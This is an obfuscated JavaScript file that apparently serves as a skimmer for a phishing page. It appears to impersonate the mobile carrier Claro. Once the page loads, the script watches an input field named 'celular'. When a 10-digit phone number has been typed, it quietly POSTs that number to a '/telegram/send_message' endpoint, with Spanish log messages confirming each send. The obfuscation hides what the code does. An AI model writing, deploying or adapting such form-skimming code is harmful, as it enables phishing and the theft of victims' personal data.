const _0xb83e78 = _0x9707;
function _0x9707(_0x16e8e7, _0x5eb48e) {
  const _0x1c66b8 = _0x1c66();
  return (
    (_0x9707 = function (_0x97075c, _0x4a6d98) {
      _0x97075c = _0x97075c - 0x189;
      let _0x20a84e = _0x1c66b8[_0x97075c];
      return _0x20a84e;
    }),
    _0x9707(_0x16e8e7, _0x5eb48e)
  );
}
(function (_0x42e404, _0x2a5170) {
  const _0x435fb3 = _0x9707,
    _0x18b678 = _0x42e404();
  while (!![]) {
    try {
      const _0x2936f9 =
        -parseInt(_0x435fb3(0x19c)) / 0x1 +
        (-parseInt(_0x435fb3(0x193)) / 0x2) *
          (-parseInt(_0x435fb3(0x189)) / 0x3) +
        parseInt(_0x435fb3(0x19d)) / 0x4 +
        parseInt(_0x435fb3(0x1a1)) / 0x5 +
        (-parseInt(_0x435fb3(0x19f)) / 0x6) *
          (parseInt(_0x435fb3(0x18f)) / 0x7) +
        (parseInt(_0x435fb3(0x18d)) / 0x8) *
          (parseInt(_0x435fb3(0x1a3)) / 0x9) +
        (parseInt(_0x435fb3(0x199)) / 0xa) *
          (-parseInt(_0x435fb3(0x1a4)) / 0xb);
      if (_0x2936f9 === _0x2a5170) break;
      else _0x18b678["push"](_0x18b678["shift"]());
    } catch (_0x5cdb2f) {
      _0x18b678["push"](_0x18b678["shift"]());
    }
  }
})(_0x1c66, 0xea6ba);
let messageSent = ![];
async function sendToTelegram() {
  const _0x5f1223 = _0x9707,
    _0x73df34 = document["getElementById"](_0x5f1223(0x19a)),
    _0x4ccebb = _0x73df34[_0x5f1223(0x19e)];
  if (_0x4ccebb[_0x5f1223(0x194)] === 0xa && !messageSent) {
    messageSent = !![];
    try {
      const _0x162904 = await fetch(url + _0x5f1223(0x190), {
        method: _0x5f1223(0x1a0),
        headers: { "Content-Type": _0x5f1223(0x192) },
        body: JSON[_0x5f1223(0x1a2)]({ message: _0x5f1223(0x191) + _0x4ccebb }),
      });
      _0x162904["ok"]
        ? console[_0x5f1223(0x18e)](_0x5f1223(0x19b) + _0x4ccebb)
        : console["error"](
            _0x5f1223(0x197),
            await _0x162904[_0x5f1223(0x195)]()
          );
    } catch (_0x10c01a) {
      console[_0x5f1223(0x198)](_0x5f1223(0x196), _0x10c01a);
    } finally {
      messageSent = ![];
    }
  }
}
document["addEventListener"](_0xb83e78(0x18a), function () {
  const _0x4b520b = _0xb83e78,
    _0xb0af3d = document[_0x4b520b(0x18b)](_0x4b520b(0x19a));
  _0xb0af3d[_0x4b520b(0x18c)]("input", sendToTelegram);
});
function _0x1c66() {
  const _0x51d939 = [
    "json",
    "Error:",
    "Error\x20al\x20enviar\x20el\x20mensaje:",
    "error",
    "1812380DyWmRV",
    "celular",
    "Mensaje\x20enviado\x20correctamente:\x20",
    "218784qILjru",
    "7673812QokoVX",
    "value",
    "8124132rwxlAa",
    "POST",
    "196220ALHbFS",
    "stringify",
    "9boTbxe",
    "88JiibGA",
    "3mtyGxo",
    "DOMContentLoaded",
    "getElementById",
    "addEventListener",
    "11815008vCLEnA",
    "log",
    "7UqBZhD",
    "/telegram/send_message",
    "🔴\x20Celular\x20Claro:\x20",
    "application/json",
    "1096646uezWhM",
    "length",
  ];
  _0x1c66 = function () {
    return _0x51d939;
  };
  return _0x1c66();
}
